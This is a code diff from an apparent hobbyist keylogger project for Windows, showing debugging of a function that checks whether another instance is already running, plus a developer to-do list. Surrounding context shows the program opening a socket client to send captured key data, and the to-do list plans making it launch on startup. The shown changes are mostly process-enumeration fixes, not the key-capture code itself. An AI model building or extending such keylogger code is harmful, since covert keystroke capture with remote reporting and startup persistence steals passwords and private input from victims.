@@ -36,7 +36,7 @@ int retrieveProcessName(DWORD procID, char mainProcName[])
     if (strcmp(mainProcName, procName) == 0)  
     {
         keyloggerInstanceCounter++;
-        std::cout << "hehe" <<  keyloggerInstanceCounter;
+        std::cout << "COUNT: " <<  keyloggerInstanceCounter << '\n';
         if (keyloggerInstanceCounter >= 2) 
         {
             return 1;
@@ -54,10 +54,13 @@ int isProcRunning()
     char test[MAX_PATH] = "hello"; 
     HMODULE hmModule;
     DWORD cbNeeded;
-    HANDLE mainProcHandle = GetCurrentProcess();
+    DWORD mainProcId = GetCurrentProcessId();
+    HANDLE mainProcHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, mainProcId);
+    //std::cout << GetLastError();
     if (mainProcHandle) 
     {
         GetModuleBaseNameA(mainProcHandle, hmModule, mainProcName, sizeof(mainProcName)/sizeof(char));
+        std::cout << GetLastError();
     }
     CloseHandle(mainProcHandle);
     EnumProcesses(procIDs, sizeof(procIDs), &cbNeeded);
@@ -94,6 +97,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     PSTR lpCmdLine, int nCmdShow)
 {
     isProcRunning();
+    return 1;
     Maps vkMaps;
     SOCKET sObjClient = initClient();
     vkMaps.initializeMaps();
@@ -140,12 +144,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     so far, these are the only issues I've found during testing. That and additional dll files are needed to run
     independently. 
     
-
         To-Do list
     ~ create a function to check if the code program is already running. 
         todo: fix code in isProcRunning so that mainProcName is getting data assigned by GetModuleBaseNameA(). 
-
-
+            update: I found the bug that is replacing main.exe with a ? inside of isProcRunning(), turns out that if i do not place
+            a return statement under the function call to isProcRunning(), it writes a ? to the c string mainProcName. 
+            A fix is still pending as I've not found a solution to the problem, I will work towards creating a fix.
 
     ~ check documentation for ALL code files to ensure everything is written clearly, and concisely. 
     ~ write code to schedule this program to be run on startup.
